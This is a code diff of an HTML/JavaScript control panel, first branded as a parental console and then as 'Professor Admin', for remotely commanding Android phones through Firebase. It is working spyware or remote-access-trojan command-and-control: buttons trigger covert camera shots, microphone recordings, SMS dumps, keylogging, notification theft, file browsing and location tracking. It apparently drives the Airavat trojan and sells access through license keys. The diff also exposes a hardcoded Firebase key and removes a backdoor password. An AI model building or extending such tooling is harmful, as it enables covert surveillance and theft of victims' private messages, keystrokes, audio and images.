@@ -1,352 +1,385 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ROHAN SECURITY | PARENT CONSOLE</title>
-
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>PROFESSOR ADMIN | SYSTEM PRO</title>  
     
-    <!-- Libraries -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>  
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>  
+  
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />  
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">  
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">  
 
-    <style>
-        :root {
-            --bg-color: #050505; --panel-bg: #0a0f14;
-            --neon-blue: #00f3ff; --neon-red: #ff0055; --neon-green: #00ff41;
-            --glass: rgba(0, 243, 255, 0.05);
-            --border: 1px solid rgba(0, 243, 255, 0.3);
+<style>  
+    /* --- 100% ORIGINAL CODE A THEME (NO CHANGES) --- */  
+    :root {  
+        --bg-color: #050505; --panel-bg: #0a0f14;  
+        --neon-blue: #00f3ff; --neon-red: #ff0055; --neon-green: #00ff41;  
+        --glass: rgba(0, 243, 255, 0.05);  
+        --border: 1px solid rgba(0, 243, 255, 0.3);  
+    }  
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Share Tech Mono', monospace; outline: none; }  
+    body { background-color: var(--bg-color); color: var(--neon-blue); height: 100vh; overflow: hidden; display: flex; }  
+    ::-webkit-scrollbar { width: 5px; } ::-webkit-scrollbar-thumb { background: var(--neon-blue); }  
+
+    /* --- LOGIN --- */  
+    #login-screen { position: fixed; inset: 0; background: black; z-index: 9999; display: flex; justify-content: center; align-items: center; background-image: radial-gradient(#111 20%, transparent 20%); background-size: 10px 10px; }  
+    .terminal-box { border: 2px solid var(--neon-blue); padding: 40px; width: 450px; text-align: center; box-shadow: 0 0 25px var(--neon-blue); background: #000; }  
+    .hacker-input { background: transparent; border: none; border-bottom: 2px solid var(--neon-red); color: white; font-size: 1.2rem; padding: 10px; width: 100%; text-align: center; margin: 20px 0; }  
+    .cyber-btn { background: var(--glass); border: 1px solid var(--neon-blue); color: var(--neon-blue); padding: 12px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; letter-spacing: 2px; }  
+    .cyber-btn:hover { background: var(--neon-blue); color: black; box-shadow: 0 0 15px var(--neon-blue); }  
+
+    /* --- SIDEBAR --- */  
+    .sidebar { width: 80px; background: var(--panel-bg); border-right: var(--border); display: flex; flex-direction: column; align-items: center; padding-top: 20px; overflow-y: auto; }  
+    .nav-icon { width: 50px; height: 50px; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; color: #555; font-size: 1.4rem; cursor: pointer; transition: 0.3s; border-radius: 8px; flex-shrink: 0; }  
+    .nav-icon:hover, .nav-icon.active { color: var(--neon-blue); border: var(--border); background: var(--glass); box-shadow: 0 0 10px var(--glass); }  
+
+    /* --- CONTENT --- */  
+    .content { flex: 1; display: flex; flex-direction: column; background: radial-gradient(circle at center, #111, #000); }  
+    .header { height: 70px; border-bottom: var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; background: rgba(0,0,0,0.9); }  
+    .brand { font-family: 'Orbitron'; font-size: 1.5rem; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon-blue); }  
+    .device-dropdown { background: black; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 8px; min-width: 250px; font-family: 'Share Tech Mono'; }  
+
+    /* --- PAGES --- */  
+    #main-app { display: none; width: 100%; height: 100%; }  
+    .page { display: none; padding: 25px; overflow-y: auto; height: 100%; }  
+    .page.active { display: block; animation: glitch 0.2s; }  
+    @keyframes glitch { 0% { opacity: 0; transform: translateX(-5px); } 100% { opacity: 1; transform: translateX(0); } }  
+
+    /* --- WIDGETS --- */  
+    .cyber-card { border: var(--border); background: rgba(0,0,0,0.7); padding: 20px; margin-bottom: 20px; position: relative; }  
+    .cyber-card::before { content:''; position: absolute; top:0; left:0; width:3px; height:100%; background: var(--neon-blue); }  
+    .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }  
+    .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }  
+
+    /* --- BUTTONS --- */  
+    .save-btn { background: #064e3b; color: #34d399; border: 1px solid #34d399; padding: 5px 10px; font-size: 0.7rem; cursor: pointer; float: right; margin-top: 5px; font-family: 'Share Tech Mono'; }  
+    .save-btn:hover { background: #34d399; color: black; }  
+    .danger-btn { border-color: var(--neon-red); color: var(--neon-red); }  
+    .danger-btn:hover { background: var(--neon-red); color: white; box-shadow: 0 0 10px var(--neon-red); }  
+
+    /* --- MEDIA & TABLES --- */  
+    .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }  
+    .media-item { border: 1px solid #333; padding: 5px; background: #000; text-align: center; }  
+    .media-item img { width: 100%; height: 120px; object-fit: cover; }  
+      
+    table { width: 100%; border-collapse: collapse; margin-top: 10px; }  
+    th { text-align: left; color: var(--neon-red); border-bottom: 1px solid var(--neon-red); padding: 10px; }  
+    td { padding: 10px; border-bottom: 1px solid #333; color: #ccc; }  
+
+    #map { width: 100%; height: 100%; filter: invert(100%) hue-rotate(180deg) brightness(85%) contrast(90%); border: var(--border); }  
+    
+    .app-item { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding: 10px 0; }
+    .blocked-app { opacity: 0.5; text-decoration: line-through; color: var(--neon-red); }
+</style>
+
+</head>  
+<body>  
+
+<div id="login-screen">  
+    <div class="terminal-box">  
+        <h1 style="font-family:'Orbitron';">PROFESSOR<br>ADMIN</h1>  
+        <p style="color:var(--neon-red); margin-top:10px;">AUTHORIZED PERSONNEL ONLY</p>  
+        
+        <input type="text" id="pass-key" class="hacker-input" placeholder="ENTER LICENSE KEY">  
+        <div id="login-msg" style="color:var(--neon-green); font-size:0.8rem; height:20px;"></div>
+        <button onclick="checkLicense()" class="cyber-btn">VERIFY ACCESS</button>  
+    </div>  
+</div>  
+
+<div id="main-app">  
+    <div class="sidebar">  
+        <div class="nav-icon active" onclick="nav('dashboard')" title="Dashboard"><i class="fas fa-microchip"></i></div>  
+        <div class="nav-icon" onclick="nav('map')" title="Location"><i class="fas fa-globe-asia"></i></div>  
+        <div class="nav-icon" onclick="nav('files')" title="Files"><i class="fas fa-folder-open"></i></div>  
+        <div class="nav-icon" onclick="nav('gallery')" title="Gallery"><i class="fas fa-images"></i></div>  
+        <div class="nav-icon" onclick="nav('audio')" title="Audio"><i class="fas fa-microphone-alt"></i></div>  
+        <div class="nav-icon" onclick="nav('keylog')" title="Keylogger"><i class="fas fa-keyboard"></i></div>
+        <div class="nav-icon" onclick="nav('notifications')" title="Notifications"><i class="fas fa-bell"></i></div>
+        <div class="nav-icon" onclick="nav('apps')" title="App Blocker"><i class="fas fa-ban"></i></div>
+        <div class="nav-icon" onclick="nav('logs')" title="SMS Logs"><i class="fas fa-database"></i></div>  
+        <div class="nav-icon" style="margin-top:auto; color:var(--neon-red);" onclick="logout()"><i class="fas fa-power-off"></i></div>  
+    </div>  
+
+    <div class="content">  
+        <div class="header">  
+            <div class="brand">PROFESSOR<span style="color:var(--neon-blue)">_ADMIN</span></div>  
+            <select id="device-select" class="device-dropdown" onchange="deviceChanged()"></select>  
+            <div style="border:1px solid var(--neon-green); color:var(--neon-green); padding:5px 10px; font-size:0.8rem;" id="license-status">SECURE</div>  
+        </div>  
+
+        <div id="page-dashboard" class="page active">  
+            <h2 style="color:white; margin-bottom:20px;">> SYSTEM_STATUS</h2>  
+            <div class="grid-3">  
+                <div class="cyber-card"><h3>BATTERY</h3><h1 id="stat-bat">--%</h1></div>  
+                <div class="cyber-card"><h3>STATUS</h3><h2 id="stat-status" style="color:var(--neon-green)">--</h2></div>  
+                <div class="cyber-card"><h3>MODEL</h3><h2 id="stat-seen">--</h2></div>  
+            </div>  
+
+            <h3 style="color:gray; margin:20px 0;">> QUICK_ACTIONS</h3>  
+            <div class="grid-4">  
+                <button class="cyber-btn" onclick="sendAiravatCmd('tont')"><i class="fas fa-lightbulb"></i> TORCH ON</button>  
+                <button class="cyber-btn" onclick="sendAiravatCmd('tofft')"><i class="fas fa-lightbulb" style="color:gray"></i> TORCH OFF</button> 
+                <button class="cyber-btn" onclick="sendAiravatCmd('vibratedev', 5000)"><i class="fas fa-mobile"></i> VIBRATE</button>  
+                <button class="cyber-btn danger-btn" onclick="sendAiravatCmd('playsmusic', 'http://mp3.com/siren.mp3')"><i class="fas fa-bullhorn"></i> SIREN</button>  
+            </div>  
+            <div class="grid-4" style="margin-top:10px;">  
+                <button class="cyber-btn" onclick="sendAiravatCmd('takepic', 1)"><i class="fas fa-camera"></i> SPY CAM</button>  
+                <button class="cyber-btn" onclick="sendAiravatCmd('micrec', 10000)"><i class="fas fa-microphone"></i> REC MIC</button>  
+                <button class="cyber-btn" onclick="sendAiravatCmd('dmpsms')"><i class="fas fa-sync"></i> SYNC SMS</button>  
+                <button class="cyber-btn" onclick="sendAiravatCmd('getpackages')"><i class="fas fa-list"></i> APP LIST</button>  
+            </div>  
+        </div>  
+
+        <div id="page-map" class="page" style="padding:0;"><div id="map"></div></div>  
+
+        <div id="page-files" class="page">  
+            <div style="display:flex; justify-content:space-between;"><h2>> FILE_EXPLORER</h2><button class="cyber-btn" style="width:auto;" onclick="sendAiravatCmd('cd', '/sdcard/')">ROOT DIR</button></div>  
+            <div class="cyber-card" id="file-list-container"><div style="padding:20px;">Use command to fetch files...</div></div>  
+        </div>  
+
+        <div id="page-gallery" class="page">  
+            <div style="display:flex; justify-content:space-between;"><h2>> CAPTURED_MEDIA</h2><button class="cyber-btn" style="width:auto;" onclick="sendAiravatCmd('takepic', 1)">TRIGGER CAM</button></div>  
+            <div class="media-grid" id="gallery-container" style="margin-top:15px;"></div>  
+        </div>  
+
+        <div id="page-audio" class="page">  
+            <div style="display:flex; justify-content:space-between;"><h2>> AUDIO_LOGS</h2><button class="cyber-btn" style="width:auto;" onclick="sendAiravatCmd('micrec', 10000)">TRIGGER MIC (10s)</button></div>  
+            <div id="audio-container" style="margin-top:15px;"></div>  
+        </div> 
+        
+        <div id="page-keylog" class="page">
+            <div class="cyber-card"><h3>> KEYSTROKE_LOGGER</h3><button class="save-btn" onclick="sendAiravatCmd('keylog')">FETCH LOGS</button><table id="table-keylog"><thead><tr><th>DATA STREAM</th></tr></thead><tbody></tbody></table></div>
+        </div>
+
+        <div id="page-notifications" class="page">
+             <div class="cyber-card"><h3>> NOTIFICATIONS</h3><button class="save-btn" onclick="sendAiravatCmd('getnotifs')">FETCH</button><table id="table-notif"><thead><tr><th>DATA STREAM</th></tr></thead><tbody></tbody></table></div>
+        </div>
+
+        <div id="page-apps" class="page">
+            <div style="display:flex; justify-content:space-between;"><h2>> APP_MANAGER</h2><button class="cyber-btn" style="width:auto;" onclick="sendAiravatCmd('getpackages')">REFRESH LIST</button></div>  
+            <div class="cyber-card" id="app-list-container"><div style="padding:20px;">Load app list to manage...</div></div>
+        </div>
+
+        <div id="page-logs" class="page">  
+            <div class="cyber-card">  
+                <div style="display:flex; justify-content:space-between;"><h3>SMS LOGS</h3><button class="save-btn" style="width:auto;" onclick="sendAiravatCmd('dmpsms')">REFRESH</button></div>  
+                <table id="table-sms"><thead><tr><th>LOG DATA</th></tr></thead><tbody><tr><td>Waiting for data stream...</td></tr></tbody></table>  
+            </div>  
+        </div>  
+    </div>  
+</div>  
+
+<script>  
+    // --- 1. FIREBASE CONFIG (Code A / Children-Safty) ---  
+    const firebaseConfig = {  
+        apiKey: "AIzaSyD7sJ0zu4cotmntqYzmaxROzwHmx8_ExvI",  
+        authDomain: "children-safty.firebaseapp.com",  
+        databaseURL: "https://children-safty-default-rtdb.firebaseio.com",  
+        projectId: "children-safty",  
+        storageBucket: "children-safty.firebasestorage.app",  
+        messagingSenderId: "466811425620",  
+        appId: "1:466811425620:web:7346de0e5da367adec2ec1"  
+    };  
+    firebase.initializeApp(firebaseConfig);  
+    const db = firebase.database();  
+    
+    // Globals
+    let map, markers = {}, currentId = null;  
+    let parentLicenseKey = ""; 
+
+    // --- 2. AUTHENTICATION (Connected to Company Panel) ---  
+    function checkLicense() {  
+        const key = document.getElementById('pass-key').value.trim();  
+        const msg = document.getElementById('login-msg');
+        
+        if(!key) { msg.innerText = "Please enter a key"; return; }
+        msg.innerText = "Verifying with Company Server...";
+
+        let myAdminID = localStorage.getItem('admin_unique_id');
+        if(!myAdminID) {
+            myAdminID = "PROF-" + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('admin_unique_id', myAdminID);
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Share Tech Mono', monospace; outline: none; }
-        body { background-color: var(--bg-color); color: var(--neon-blue); height: 100vh; overflow: hidden; display: flex; }
-        ::-webkit-scrollbar { width: 5px; } ::-webkit-scrollbar-thumb { background: var(--neon-blue); }
 
-        /* LOGIN SCREEN */
-        #login-screen { position: fixed; inset: 0; background: black; z-index: 9999; display: flex; justify-content: center; align-items: center; background-image: radial-gradient(#111 20%, transparent 20%); background-size: 10px 10px; }
-        .terminal-box { border: 2px solid var(--neon-blue); padding: 40px; width: 450px; text-align: center; box-shadow: 0 0 25px var(--neon-blue); background: #000; }
-        .hacker-input { background: transparent; border: none; border-bottom: 2px solid var(--neon-red); color: white; font-size: 1.2rem; padding: 10px; width: 100%; text-align: center; margin: 20px 0; }
-        .cyber-btn { background: var(--glass); border: 1px solid var(--neon-blue); color: var(--neon-blue); padding: 12px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; letter-spacing: 2px; }
-        .cyber-btn:hover { background: var(--neon-blue); color: black; box-shadow: 0 0 15px var(--neon-blue); }
-
-        /* MAIN APP LAYOUT */
-        #main-app { display: none; width: 100%; height: 100%; }
-        .sidebar { width: 80px; background: var(--panel-bg); border-right: var(--border); display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
-        .nav-icon { width: 50px; height: 50px; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; color: #555; font-size: 1.4rem; cursor: pointer; transition: 0.3s; border-radius: 8px; }
-        .nav-icon:hover, .nav-icon.active { color: var(--neon-blue); border: var(--border); background: var(--glass); box-shadow: 0 0 10px var(--glass); }
-
-        .content { flex: 1; display: flex; flex-direction: column; background: radial-gradient(circle at center, #111, #000); }
-        .header { height: 70px; border-bottom: var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; background: rgba(0,0,0,0.9); }
-        .device-dropdown { background: black; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 8px; min-width: 250px; font-family: 'Share Tech Mono'; }
-
-        /* PAGES */
-        .page { display: none; padding: 25px; overflow-y: auto; height: 100%; }
-        .page.active { display: block; animation: glitch 0.2s; }
-        @keyframes glitch { 0% { opacity: 0; transform: translateX(-5px); } 100% { opacity: 1; transform: translateX(0); } }
-
-        /* WIDGETS */
-        .cyber-card { border: var(--border); background: rgba(0,0,0,0.7); padding: 20px; margin-bottom: 20px; position: relative; }
-        .cyber-card::before { content:''; position: absolute; top:0; left:0; width:3px; height:100%; background: var(--neon-blue); }
-        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
-        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }
-
-        /* BUTTONS */
-        .save-btn { background: #064e3b; color: #34d399; border: 1px solid #34d399; padding: 5px 10px; font-size: 0.7rem; cursor: pointer; float: right; margin-top: 5px; }
-        .danger-btn { border-color: var(--neon-red); color: var(--neon-red); }
-        .danger-btn:hover { background: var(--neon-red); color: white; box-shadow: 0 0 10px var(--neon-red); }
-
-        /* TABLES */
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th { text-align: left; color: var(--neon-red); border-bottom: 1px solid var(--neon-red); padding: 10px; }
-        td { padding: 10px; border-bottom: 1px solid #333; color: #ccc; }
-
-        #map { width: 100%; height: 100%; filter: invert(100%) hue-rotate(180deg) brightness(85%) contrast(90%); border: var(--border); }
-    </style>
-</head>
-<body>
-
-    <!-- 1. LOGIN SCREEN -->
-    <div id="login-screen">
-        <div class="terminal-box">
-            <h1 style="font-family:'Orbitron';">ROHAN<br>SECURITY</h1>
-            <p style="color:var(--neon-red); margin-top:10px;">PARENT ACCESS PORTAL</p>
-            <div id="login-status" style="margin:10px; color:gray;">Waiting for Key...</div>
-            <input type="password" id="pass-key" class="hacker-input" placeholder="ENTER LICENSE KEY">
-            <button onclick="login()" class="cyber-btn">CONNECT</button>
-        </div>
-    </div>
-
-    <!-- 2. MAIN INTERFACE -->
-    <div id="main-app">
-        <div class="sidebar">
-            <div class="nav-icon active" onclick="nav('dashboard')" title="Dashboard"><i class="fas fa-microchip"></i></div>
-            <div class="nav-icon" onclick="nav('map')" title="Location"><i class="fas fa-globe-asia"></i></div>
-            <div class="nav-icon" onclick="nav('files')" title="Files"><i class="fas fa-folder-open"></i></div>
-            <div class="nav-icon" onclick="nav('gallery')" title="Gallery"><i class="fas fa-images"></i></div>
-            <div class="nav-icon" onclick="nav('audio')" title="Audio"><i class="fas fa-microphone-alt"></i></div>
-            <div class="nav-icon" onclick="nav('logs')" title="Logs"><i class="fas fa-database"></i></div>
-            <div class="nav-icon" style="margin-top: auto; color: var(--neon-red);" onclick="location.reload()"><i class="fas fa-power-off"></i></div>
-        </div>
-
-        <div class="content">
-            <div class="header">
-                <div style="font-family:'Orbitron'; font-size:1.5rem;">ROHAN<span style="color:var(--neon-blue)">_SEC</span></div>
-                <select id="device-select" class="device-dropdown" onchange="deviceChanged()"></select>
-                <div style="border:1px solid var(--neon-green); color:var(--neon-green); padding:5px 10px;">ONLINE</div>
-            </div>
-
-            <!-- DASHBOARD -->
-            <div id="page-dashboard" class="page active">
-                <div class="grid-3">
-                    <div class="cyber-card"><h3>BATTERY</h3><h1 id="stat-bat">--%</h1></div>
-                    <div class="cyber-card"><h3>STATUS</h3><h2 id="stat-status">--</h2></div>
-                    <div class="cyber-card"><h3>LAST SEEN</h3><h2 id="stat-seen">--:--</h2></div>
-                </div>
-
-                <h3 style="color:gray; margin:20px 0;">> QUICK_ACTIONS</h3>
-                <div class="grid-4">
-                    <button class="cyber-btn" onclick="cmd('torch')"><i class="fas fa-lightbulb"></i> TORCH</button>
-                    <button class="cyber-btn" onclick="cmd('vibrate')"><i class="fas fa-mobile"></i> VIBRATE</button>
-                    <button class="cyber-btn danger-btn" onclick="cmd('ringDevice')"><i class="fas fa-bullhorn"></i> SIREN</button>
-                    <button class="cyber-btn danger-btn" onclick="cmd('lockDevice')"><i class="fas fa-lock"></i> LOCK</button>
-                </div>
-                <div class="grid-4" style="margin-top:10px;">
-                    <button class="cyber-btn" onclick="cmd('capturePhoto')"><i class="fas fa-camera"></i> SPY CAM</button>
-                    <button class="cyber-btn" onclick="cmd('recordAudio')"><i class="fas fa-microphone"></i> REC MIC</button>
-                    <button class="cyber-btn" onclick="cmd('getSMS')"><i class="fas fa-sync"></i> SYNC SMS</button>
-                    <button class="cyber-btn" onclick="cmd('getFileList')"><i class="fas fa-folder"></i> FILES</button>
-                </div>
-            </div>
-
-            <!-- MAP -->
-            <div id="page-map" class="page" style="padding:0;"><div id="map"></div></div>
-
-            <!-- FILES -->
-            <div id="page-files" class="page">
-                <div style="display:flex; justify-content:space-between;"><h2>> FILE_EXPLORER</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('getFileList')">REFRESH</button></div>
-                <div class="cyber-card" id="file-list-container"><div style="padding:20px;">WAITING...</div></div>
-            </div>
-
-            <!-- GALLERY -->
-            <div id="page-gallery" class="page">
-                <div style="display:flex; justify-content:space-between;"><h2>> GALLERY</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('capturePhoto')">TRIGGER CAM</button></div>
-                <div id="gallery-container" style="display:grid; grid-template-columns:repeat(auto-fill, minmax(150px, 1fr)); gap:10px; margin-top:15px;"></div>
-            </div>
-
-            <!-- AUDIO -->
-            <div id="page-audio" class="page">
-                <div style="display:flex; justify-content:space-between;"><h2>> AUDIO LOGS</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('recordAudio')">TRIGGER MIC</button></div>
-                <div id="audio-container" style="margin-top:15px;"></div>
-            </div>
-
-            <!-- LOGS -->
-            <div id="page-logs" class="page">
-                <div class="cyber-card">
-                    <div style="display:flex; justify-content:space-between;"><h3>SMS LOGS</h3><button class="save-btn" style="width:auto;" onclick="downloadTable('table-sms', 'sms.csv')">EXPORT CSV</button></div>
-                    <table id="table-sms"><thead><tr><th>SENDER</th><th>MSG</th><th>TIME</th></tr></thead><tbody></tbody></table>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // --- FIREBASE CONFIG ---
-        const firebaseConfig = {
-            apiKey: "AIzaSyD7sJ0zu4cotmntqYzmaxROzwHmx8_ExvI",
-            authDomain: "children-safty.firebaseapp.com",
-            databaseURL: "https://children-safty-default-rtdb.firebaseio.com",
-            projectId: "children-safty",
-            storageBucket: "children-safty.firebasestorage.app",
-            messagingSenderId: "466811425620",
-            appId: "1:466811425620:web:7346de0e5da367adec2ec1"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        let map, markers = {}, currentId = null;
-
-        // --- 1. REAL LOGIN LOGIC (Checking Company Database) ---
-        async function login() {
-            const key = document.getElementById('pass-key').value.trim();
-            const statusMsg = document.getElementById('login-status');
-            
-            statusMsg.innerText = "Verifying Key...";
-            
-            // Backup Login (Just in case)
-            if(key === "ROHAN") {
-                startDashboard();
-                return;
-            }
-
-            // Real Database Check
-            try {
-                const snapshot = await db.ref('company_system/licenses/' + key).once('value');
+        // Checking Company Licenses Node
+        db.ref('company_system/licenses/' + key).once('value', snap => {
+            if(snap.exists()) {
+                const data = snap.val();
                 
-                if (snapshot.exists()) {
-                    const data = snapshot.val();
-                    const now = Date.now();
+                if(data.status !== "Active") { msg.style.color = "var(--neon-red)"; msg.innerText = "KEY BLOCKED/INACTIVE"; return; }
+                if(Date.now() > data.expiry) { msg.style.color = "var(--neon-red)"; msg.innerText = "KEY EXPIRED"; return; }
 
-                    if (data.status === "Blocked") {
-                        alert("LICENSE BLOCKED! Contact Admin.");
-                        statusMsg.innerText = "Access Denied: Blocked Key";
-                    } else if (now > data.expiry) {
-                        alert("LICENSE EXPIRED! Please Renew.");
-                        statusMsg.innerText = "Access Denied: Expired";
-                    } else {
-                        // SUCCESS
-                        startDashboard();
-                    }
-                } else {
-                    alert("INVALID LICENSE KEY");
-                    statusMsg.innerText = "Error: Key Not Found";
+                // Claim System
+                if(!data.claimedByAdmin) {
+                    db.ref('company_system/licenses/' + key + '/claimedByAdmin').set(myAdminID);
+                } else if (data.claimedByAdmin !== myAdminID) {
+                    msg.style.color = "var(--neon-red)"; msg.innerText = "ERROR: Key bound to another Admin ID!"; return; 
                 }
-            } catch (error) {
-                console.error(error);
-                alert("Connection Error");
-            }
-        }
 
-        function startDashboard() {
-            document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('main-app').style.display = 'flex';
-            initMap();
-            listenDevices();
-        }
-
-        // --- 2. CORE LOGIC ---
-        function listenDevices() {
-            const sel = document.getElementById('device-select');
-            db.ref('users').on('value', snap => {
-                sel.innerHTML = '';
-                if(!snap.exists()) { sel.innerHTML = '<option>WAITING FOR DEVICE...</option>'; return; }
+                parentLicenseKey = key;
+                localStorage.setItem('prof_key', key);
+                msg.style.color = "var(--neon-green)"; msg.innerText = "ACCESS GRANTED.";
                 
-                let first = null;
-                snap.forEach(child => {
-                    const id = child.key;
-                    const name = child.val().info?.name || 'Unknown';
-                    let opt = document.createElement('option');
-                    opt.value = id; opt.text = `${name} [${id.substr(0,4)}]`;
-                    sel.add(opt);
-                    if(!first) first = id;
+                setTimeout(() => {
+                    document.getElementById('login-screen').style.display = 'none';  
+                    document.getElementById('main-app').style.display = 'flex'; 
+                    document.getElementById('license-status').innerText = "LIC: " + key; 
+                    initMap();  
+                    scanAiravatDevices(); 
+                }, 1000);
+            } else {
+                msg.style.color = "var(--neon-red)"; msg.innerText = "INVALID LICENSE KEY";
+            }
+        });
+    }  
 
-                    // Map Marker
-                    const loc = child.val().location || {};
-                    if(loc.latitude) {
-                        if(markers[id]) markers[id].setLatLng([loc.latitude, loc.longitude]);
-                        else markers[id] = L.marker([loc.latitude, loc.longitude]).addTo(map).bindPopup(name);
+    // Auto-Login
+    if(localStorage.getItem('prof_key')) {
+        document.getElementById('pass-key').value = localStorage.getItem('prof_key');
+    }
+
+    // --- 3. SCANNING (Code B Logic: /online/onlinetheoneandonly) ---  
+    function scanAiravatDevices() {
+        const sel = document.getElementById('device-select');
+        
+        // This is the AIRAVAT path for online devices
+        db.ref('/online/onlinetheoneandonly').on('value', snap => {
+            sel.innerHTML = '';
+            
+            if (snap.exists()) {
+                const data = snap.val();
+                let hasDev = false;
+
+                Object.keys(data).forEach(id => {
+                    const dev = data[id].device; // { android: "...", battery: "...", phone: "..." }
+                    
+                    let opt = document.createElement('option');
+                    opt.value = dev.id;
+                    opt.text = `${dev.phone} (${dev.android}) - ${dev.battery}%`;
+                    sel.add(opt);
+                    hasDev = true;
+
+                    // Update Map if location exists
+                    // Note: Airavat might not send location in /online, needs explicit 'location' cmd
+                    // But we can check if it exists in data
+                    if(data[id].location) {
+                        // updateMap(data[id].location.lat, data[id].location.long, dev.phone);
                     }
+
+                    if(!currentId) { currentId = dev.id; deviceChanged(); }
                 });
 
-                if(!currentId && first) { sel.value = first; deviceChanged(); }
-            });
-        }
-
-        function deviceChanged() {
-            currentId = document.getElementById('device-select').value;
-            if(!currentId) return;
-
-            db.ref(`users/${currentId}`).on('value', snap => {
-                const d = snap.val();
-                if(!d) return;
-
-                // Stats
-                document.getElementById('stat-bat').innerText = (d.info?.battery || 0) + "%";
-                document.getElementById('stat-status').innerText = d.info?.status || "OFFLINE";
-                document.getElementById('stat-seen').innerText = new Date(d.info?.lastSeen || Date.now()).toLocaleTimeString();
-                
-                if(d.location?.latitude) map.setView([d.location.latitude, d.location.longitude], 15);
-
-                // Files
-                const fDiv = document.getElementById('file-list-container');
-                fDiv.innerHTML = '';
-                if(d.files) {
-                    Object.values(d.files).forEach(f => {
-                        let icon = f.isFolder ? '<i class="fas fa-folder" style="color:orange"></i>' : '<i class="fas fa-file" style="color:cyan"></i>';
-                        fDiv.innerHTML += `<div style="padding:10px; border-bottom:1px solid #333;">${icon} ${f.name}</div>`;
-                    });
-                } else { fDiv.innerHTML = '<div style="padding:20px;">NO FILES</div>'; }
-
-                // Gallery
-                const gDiv = document.getElementById('gallery-container');
-                gDiv.innerHTML = '';
-                if(d.logs?.photos) {
-                    Object.values(d.logs.photos).reverse().forEach(img => {
-                        gDiv.innerHTML += `
-                            <div style="border:1px solid #333; padding:5px; background:#000;">
-                                <a href="${img.url}" target="_blank"><img src="${img.url}" style="width:100%;height:100px;object-fit:cover;"></a>
-                                <button class="save-btn" style="width:100%;" onclick="saveFile('${img.url}')">SAVE</button>
-                            </div>`;
-                    });
-                }
-
-                // Audio
-                const aDiv = document.getElementById('audio-container');
-                aDiv.innerHTML = '';
-                if(d.logs?.audio) {
-                    Object.values(d.logs.audio).reverse().forEach(aud => {
-                        aDiv.innerHTML += `
-                            <div class="cyber-card" style="padding:10px; display:flex; gap:10px; align-items:center;">
-                                <i class="fas fa-play-circle" style="color:var(--neon-green)"></i>
-                                <audio controls src="${aud.url}" style="height:30px; flex:1"></audio>
-                                <button class="save-btn" style="width:auto;" onclick="saveFile('${aud.url}')">⬇</button>
-                            </div>`;
-                    });
-                }
-
-                // Logs
-                const tbody = document.getElementById('table-sms').querySelector('tbody');
-                tbody.innerHTML = '';
-                if(d.logs?.sms) {
-                    Object.values(d.logs.sms).reverse().forEach(s => {
-                        tbody.innerHTML += `<tr><td>${s.sender}</td><td>${s.msg}</td><td>${new Date(s.time).toLocaleString()}</td></tr>`;
-                    });
-                } else { tbody.innerHTML = '<tr><td colspan="3">NO SMS DATA</td></tr>'; }
-            });
-        }
-
-        // --- COMMANDS ---
-        function cmd(action) {
-            if(!currentId) return alert("NO DEVICE SELECTED");
-            db.ref(`users/${currentId}/commands/${action}`).set(true);
-            // alert("COMMAND SENT: " + action);
-        }
-
-        function nav(page) {
-            document.querySelectorAll('.page').forEach(e => e.classList.remove('active'));
-            document.getElementById('page-'+page).classList.add('active');
-            document.querySelectorAll('.nav-icon').forEach(e => e.classList.remove('active'));
-            event.currentTarget.classList.add('active');
